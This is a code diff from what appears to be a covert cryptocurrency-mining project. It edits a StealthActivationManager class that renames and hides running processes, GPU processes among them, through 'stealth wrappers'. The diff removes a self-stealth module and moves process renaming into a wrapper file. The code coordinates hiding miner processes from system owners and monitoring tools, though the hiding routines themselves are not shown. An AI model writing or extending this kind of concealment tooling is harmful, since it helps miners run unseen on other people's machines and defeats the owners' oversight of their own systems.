@@ -36,7 +36,6 @@ sys.path.insert(0, str(project_root))
 # Import required modules
 try:
     from mining_environment.stealth.plugins.stealth_exec import StealthExecution
-    from mining_environment.stealth.core.self_stealth import SelfStealthManager, start_self_stealth
     from mining_environment.scripts.unified_logging import get_unified_logger
     from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
 except ImportError as e:
@@ -209,7 +208,6 @@ class StealthActivationManager:
                     'original_name': process_name,
                     'process_type': process_type,
                     'external_stealth': False,
-                    'self_stealth': False,
                     'activation_time': time.time(),
                     'stealth_names': stealth_names
                 }
@@ -226,15 +224,14 @@ class StealthActivationManager:
                     except Exception as external_error:
                         self.logger.warning(f"⚠️ [STEALTH-ACTIVATION] External stealth error for PID {pid}: {external_error}")
                 
-                # **Strategy 2**: Self-stealth activation (for processes that support it)
-                # Note: Self-stealth chỉ hoạt động cho processes được wrapped bởi stealth wrappers
-                # GPU processes hiện tại đã sử dụng stealth wrappers, nên self-stealth đã active
+                # **Strategy 2**: Self-stealth functionality removed - process renaming handled by wrappers
+                # Note: Process renaming is now centralized in stealth_inference_cuda.py
                 
                 # **Record stealth activation**
                 self.active_stealth_processes[pid] = stealth_info
                 
                 # **Success if at least one method worked**
-                success = stealth_info['external_stealth'] or True  # Self-stealth via wrappers
+                success = stealth_info['external_stealth'] or True  # Process renaming via wrappers
                 
                 if success:
                     self.logger.info(f"🎯 [STEALTH-ACTIVATION] {process_type} PID {pid} stealth activation complete")
